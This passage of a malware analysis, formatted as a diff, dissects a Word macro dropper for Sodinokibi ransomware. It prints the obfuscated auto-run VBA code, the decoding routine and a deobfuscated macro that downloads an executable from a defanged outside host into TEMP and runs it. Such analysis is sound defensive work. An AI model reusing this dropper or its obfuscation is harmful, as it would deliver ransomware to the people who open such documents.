@@ -1,0 +1,13 @@
+Most of the Macro code in the document looks innocent and is there to divert from the malicious code, which executes on Document_Open. The obfuscated VBA code uses long scrambled variable and function/sub names, encoded strings, junk parameters and conditions. The unaltered main code is below.
+
+Sub docUmeNt_opeN() AïöJ­V39ª(0) = "TwPgELNvMievP,~H" AïöJ­V39ª(1) = "S3v]hZFNe?N6l@fil?K9.J\@ANT2p)Y_pIo5lel2iL7jc4Zqav_utuJpi=^ho}4+ndG0" çê½Iâ¿® = ®M¿rº¥»¬¢­(üDFW´³©¥nhEcu¬·Ñé(Z®»6û«¿KWiæ¬·(0, -6491, -6012))) + üDFW´³©¥nhEcu¬·Ñé("\j/?MtxaiT_ycD.pr,3ZoRuOsNp>o,28fIp6t\GP-dESWaZ6oE18rJ.odNZ_.U1)e-~|x//YeFe{") Call NqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxwqBwFx(0, üDFW´³©¥nhEcu¬·Ñé("h-Gtth\XtFj]p++G:z`P/`0R/^RYbh2)lpD:a16]ex}jrR?YcyhDkQp/.tZRxMfNy)vhz~C>/rD<ssw?aF=\b~2,o[OI.veFe55`xRrWeUK]"), çê½Iâ¿®, 0, 0) CreateObject(üDFW´³©¥nhEcu¬·Ñé(Z®»6û«¿KWiæ¬·(1, 5279, -6017))).Open (çê½Iâ¿®) End Sub
+
+The string decoding function simply extracts every fourth letter from the string. Below is the deobfuscated decoding function.
+
+Function DecodeString(EncodedString) As String Dim SomeByteArray(1055) As Byte, AnotherByteArray() As Byte AnotherByteArray = StrConv(EncodedString, 128) ' vbFromUnicode For idx = 0 To UBound(AnotherByteArray) - 1 If (idx Mod 4 = 0) Then SomeByteArray(arrayIndex) = AnotherByteArray(idx) arrayIndex = arrayIndex + 1 End If Next idx DecodeString = Left(StrConv(SomeByteArray, 64), arrayIndex) ' 64 = vbUnicode End Function
+
+The main code downloads Sodinokibi to TEMP\Microsoft-Word.exe and executes it. It looks as follows after deobfuscation.
+
+Sub Document_Open() DownloadedFilePath = Environ("TEMP") + "\Microsoft-Word.exe" Call DownloadToFile(0, "hxxp://blaerck.xyz/sabo.exe", DownloadedFilePath, 0, 0) CreateObject("Shell.Application").Open (DownloadedFilePath) End Sub
+
+The downloaded file is this Sodinokibi version[3].
